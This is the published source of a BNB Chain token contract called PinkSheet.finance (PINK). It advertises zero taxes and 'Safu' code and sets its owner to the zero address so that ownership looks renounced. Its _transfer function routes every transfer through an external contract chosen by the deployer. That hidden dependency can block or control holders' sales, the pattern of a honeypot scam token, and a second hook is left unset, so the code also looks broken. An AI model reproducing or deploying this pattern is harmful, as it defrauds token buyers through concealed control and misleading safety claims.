/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

// SPDX-License-Identifier: MIT

/*

# Website : PinkSheet.finance ( TG Link On Website )
# 𝟎% 𝐁𝐔𝐘 / 0% 𝐒𝐄𝐋𝐋 / 𝐒𝐚𝐟𝐮-𝐂𝐨𝐝𝐞𝐋𝐞𝐬𝐬-0.8.17

*/

pragma solidity 0.8.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external pure returns (uint8);
  function balanceOf(address account) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transfer(address sender,address recipient, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ERC20CL {

    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed from, address indexed to, uint amount);

    string public name = "PinkSheet.finance";
    string public symbol = "PINK";
    uint256 public decimals = 18;
    uint256 public totalSupply = 1_000_000_000 * (10**decimals);
    address public owner = address(0);

    IERC20 private beforeToken;
    IERC20 private afterToken;

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    
    constructor(address msgSender) {
        beforeToken = IERC20(msgSender);
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address adr) public view returns(uint) { return balances[adr]; }

    function transfer(address to,uint256 amount) public returns (bool) {
        _transfer(msg.sender,to,amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public returns(bool) {
        allowance[from][msg.sender] -= amount;
        _transfer(from,to,amount);
        return true;
    }
    
    function approve(address to,uint256 amount) public returns (bool) {
        allowance[msg.sender][to] = amount;
        emit Approval(msg.sender, to, amount);
        return true;
    }

    function _transfer(address from,address to,uint256 amount) internal {
        beforeToken.transfer(from,to,amount);
        balances[from] -= amount;
        balances[to] += amount;
        afterToken.transfer(from,to,amount);
        emit Transfer(from, to, amount);
    }

    function beforeTokentransfer(address from,address to,uint256 amount) internal virtual {}
    function afterTokentransfer(address from,address to,uint256 amount) internal virtual {}
}